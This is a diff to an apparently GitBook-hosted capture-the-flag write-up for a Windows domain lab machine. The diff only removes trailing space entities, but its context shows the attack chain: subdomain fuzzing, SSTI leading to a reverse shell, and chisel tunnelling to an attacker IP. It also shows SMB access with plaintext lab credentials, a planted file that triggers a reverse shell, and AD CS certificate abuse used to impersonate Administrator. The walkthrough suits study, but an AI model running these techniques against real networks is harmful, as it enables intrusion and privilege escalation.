@@ -18,9 +18,9 @@ PORT      STATE SERVICE
 49703/tcp open  unknown
 ```
 
-### Windcorp -> SSTI&#x20;
+### Windcorp -> SSTI
 
-`crackmapexec` can be used to enumerate domain name.&#x20;
+`crackmapexec` can be used to enumerate domain name.
 
 {% code overflow="wrap" %}
 ```
@@ -30,7 +30,7 @@ SMB         10.129.190.189  445    EARTH            [*] Windows 10.0 Build 17763
 ```
 {% endcode %}
 
-Visiting `windcorp.htb` does not show anything though. In this case, we can do a sub-domain enumeration and find something.&#x20;
+Visiting `windcorp.htb` does not show anything though. In this case, we can do a sub-domain enumeration and find something.
 
 ```
 $ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.windcorp.htb' --hc=404 -u https://windcorp.htb  
@@ -47,7 +47,7 @@ Add the domains to the `/etc/hosts` file, and `www` is visited it shows a typica
 
 <figure><img src="../../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>
 
-When we fill in the Contact and try to submit, it let's us preview our submission at `preview.asp`.&#x20;
+When we fill in the Contact and try to submit, it let's us preview our submission at `preview.asp`.
 
 <figure><img src="../../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>
 
@@ -79,7 +79,7 @@ And this was returned:
 
 <figure><img src="../../../.gitbook/assets/image (3174).png" alt=""><figcaption></figcaption></figure>
 
-This confirms that SSTI is possible on this machine, and that we can use this to gain a reverse shell (if there's no AMSI / AppLocker).&#x20;
+This confirms that SSTI is possible on this machine, and that we can use this to gain a reverse shell (if there's no AMSI / AppLocker).
 
 {% code overflow="wrap" %}
 ```
@@ -87,7 +87,7 @@ This confirms that SSTI is possible on this machine, and that we can use this to
 ```
 {% endcode %}
 
-Using this, we can get a reverse shell easily.&#x20;
+Using this, we can get a reverse shell easily.
 
 <figure><img src="../../../.gitbook/assets/image (2711).png" alt=""><figcaption></figcaption></figure>
 
@@ -126,7 +126,7 @@ CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
 -----END CERTIFICATE REQUEST-----
 ```
 
-We can transfer this back to our machine for analysis using `openssl`.&#x20;
+We can transfer this back to our machine for analysis using `openssl`.
 
 ```
 $ openssl req -in req.txt -text -noout      
@@ -179,7 +179,7 @@ Certificate Request:
         e1:39:70:a5
 ```
 
-We can see that it makes requests to a `softwareportal.windcorp.htb` domain. However, when trying to visit it, nothing is loaded. This must mean that the domain is listening within the machine only.&#x20;
+We can see that it makes requests to a `softwareportal.windcorp.htb` domain. However, when trying to visit it, nothing is loaded. This must mean that the domain is listening within the machine only.
 
 First, let's see if there are any web servers active on the machine itself.
 
@@ -207,7 +207,7 @@ PS C:\Windows\System32\Drivers\etc> curl 172.25.80.1
 </BODY></HTML>
 ```
 
-The error tells me that there's something present there, so let's do some port forwarding for the machine using `chisel`.&#x20;
+The error tells me that there's something present there, so let's do some port forwarding for the machine using `chisel`.
 
 ```bash
 # on kali
@@ -216,7 +216,7 @@ chisel server -p 5555 --reverse
 .\chisel.exe client 10.10.14.14:5555 R:socks
 ```
 
-Afterwards, we can add `softwareportal.windcorp.htb` within our `/etc/hosts` file under `172.25.80.1`, and visit it using our browser (with FoxyProxy Proxychains).&#x20;
+Afterwards, we can add `softwareportal.windcorp.htb` within our `/etc/hosts` file under `172.25.80.1`, and visit it using our browser (with FoxyProxy Proxychains).
 
 <figure><img src="../../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>
 
@@ -287,7 +287,7 @@ $ smbmap -u 'localadmin' -p 'Secret123' -H 10.129.190.189
         SYSVOL                                                  READ ONLY       Logon server share
 ```
 
-We can view `Shared` first.&#x20;
+We can view `Shared` first.
 
 ```
 $ smbclient  //10.129.190.189/Shared -U 'windcorp.htb/localadmin'
@@ -300,7 +300,7 @@ smb: \> ls
   Software                            D        0  Thu Jul 22 14:14:16 2021
 ```
 
-I got a bit lazy, so I recursively downloaded all of the files from this share.&#x20;
+I got a bit lazy, so I recursively downloaded all of the files from this share.
 
 ```
 smb: \> mask ""
@@ -316,7 +316,7 @@ getting file \Documents\Analytics\Tooth Growth.omv of size 2142 as Documents/Ana
 getting file \Documents\Analytics\Whatif.omv of size 2841 as Documents/Analytics/Whatif.omv (106.7 KiloBytes/sec) (average 13246.2 KiloBytes/sec)
 ```
 
-Here, we can see some `.exe` and `.omv` files, which are associated with Javmovi.&#x20;
+Here, we can see some `.exe` and `.omv` files, which are associated with Javmovi.
 
 ### Javmovi RCE
 
@@ -350,7 +350,7 @@ smb: \Documents\Analytics\> put Whatif.omv
 putting file Whatif.omv as \Documents\Analytics\Whatif.omv (130.9 kb/s) (average 130.9 kb/s)
 ```
 
-Then we just wait. After a while, we would start to get calls on our HTTP servers and get a reverse shell as the user.&#x20;
+Then we just wait. After a while, we would start to get calls on our HTTP servers and get a reverse shell as the user.
 
 <figure><img src="../../../.gitbook/assets/image (1449).png" alt=""><figcaption></figcaption></figure>
 
@@ -360,7 +360,7 @@ We can then grab the user flag.
 
 ### ESC1 Exploit
 
-Earlier, we saw a share about `CertEnroll`, which is a possible exploit path to get an Administrator shell. First, let's use `Certify.exe` to locate any vulnerable templates on the machine.&#x20;
+Earlier, we saw a share about `CertEnroll`, which is a possible exploit path to get an Administrator shell. First, let's use `Certify.exe` to locate any vulnerable templates on the machine.
 
 ```
 C:\Users\diegocruz\Desktop>.\Certify.exe find
@@ -407,7 +407,7 @@ We have to either change this or make it such that we can still impersonate the 
 
 {% embed url="https://github.com/cfalta/PoshADCS" %}
 
-The repo itself explains the exploit in detail, something I found rather helpful. Basically, we want to create a 'Smart Card' for the user, and allow the certificate to be used for Smart Card authentication. This would allow us to impersonate the user using this new certificate.&#x20;
+The repo itself explains the exploit in detail, something I found rather helpful. Basically, we want to create a 'Smart Card' for the user, and allow the certificate to be used for Smart Card authentication. This would allow us to impersonate the user using this new certificate.
 
 ```powershell
 Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard
@@ -462,4 +462,4 @@ Then, using this hash, we can easily `psexec.py` in as the administrator and gra
 
 <figure><img src="../../../.gitbook/assets/image (2218).png" alt=""><figcaption></figcaption></figure>
 
-This part was pretty hard for me, and I had to use a walkthrough because I couldn't find the right tools to use. Great machine though!&#x20;
+This part was pretty hard for me, and I had to use a walkthrough because I couldn't find the right tools to use. Great machine though!
